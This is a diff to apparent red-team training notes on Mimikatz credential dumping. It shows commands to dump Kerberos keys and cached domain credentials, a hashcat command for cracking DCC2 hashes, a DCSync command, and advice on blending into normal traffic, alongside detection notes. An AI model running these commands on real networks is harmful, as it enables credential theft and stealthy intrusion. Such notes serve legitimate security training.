@@ -60,6 +60,10 @@ This module will open a read handle to LSASS which can be logged under event 465
 
 The `sekurlsa::ekeys` Mimikatz module will dump the Kerberos encryption keys of currently logged on users.
 
+Since most modern Windows services choose to use Kerberos over NTLM, leveraging these instead of NTLM hashes makes more sense for blending into normal authentication traffic.
+
+These keys can be used in a variety of Kerberos abuse scenarios.
+
 ```
 mimikatz !sekurlsa::ekeys
 ```
@@ -98,6 +102,15 @@ The `lsadump::cache` Mimikatz module can extract these from `HKLM\SECURITY`.
 mimikatz !lsadump::cache
 ```
 
+For hashcat the hashes should look like this:
+```
+$DCC2$10240#username#hash
+```
+
+```
+hashcat -a 0 -m 2100
+```
+
 **OPSEC**  
   
 This module will open a handle to the SECURITY registry hive.
@@ -125,7 +138,7 @@ Directory replication can be detected if Directory Service Access auditing is en
 
 ### For Domain and GUID
 
-Performs a DSync attack for a specified domain and GUID.
+Performs a DCSync attack for a specified domain and GUID.
 
 ```
 mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}
